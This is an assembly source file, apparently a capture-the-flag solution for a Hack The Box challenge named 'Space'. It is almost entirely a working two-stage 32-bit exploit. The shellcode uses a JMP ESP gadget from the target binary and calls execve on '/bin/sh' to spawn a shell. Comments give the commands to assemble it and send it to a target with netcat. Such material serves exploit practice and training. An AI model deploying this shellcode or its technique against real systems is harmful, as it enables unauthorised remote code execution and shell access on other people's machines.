; HTB-Pwn challenge: Space
; shellcode by Dorian Warboys / Red Skål
;
; We use a JMP ESP in 'space' binary to reach stage1 of shellcode.
;
; Guide to pwnag3:
;     $ nasm -f bin shellcode.asm
;     $ (cat shellcode;cat) | nc [ip_of_space] [port]

[bits 32]

global _start

_start:
	; second stage
	;   EAX points here.
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push edx
	push ebx
	mov ecx, esp
	int 0x80

	dd 0x0804919f		; <--- JMP ESP
	
	; first stage
	;   Originally done this way to avoid overwrite
	;   from pushing "/bin/sh" to stack. EAX is a
	;   pointer to our buffer, so ESP = EAX negates
	;   the need for arse-about-face execution but
	;   I was already at this point! XD
	mov esp, eax
	push 0xb
	pop eax
	cdq
	push edx
	jmp short _start
